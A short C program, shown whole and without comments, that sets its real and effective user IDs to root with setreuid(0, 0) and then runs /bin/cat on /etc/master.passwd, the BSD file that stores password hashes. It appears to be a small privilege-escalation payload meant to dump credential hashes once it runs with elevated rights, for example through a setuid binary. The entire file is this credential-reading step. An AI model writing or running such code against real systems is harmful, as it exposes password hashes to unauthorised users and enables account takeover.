#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(void) {
    if (setreuid(0, 0) == -1) {
        perror("setreuid");
        return EXIT_FAILURE;
    }
    execl("/bin/cat", "cat", "/etc/master.passwd", (char*)NULL);
    perror("execl");
    return EXIT_FAILURE;
}
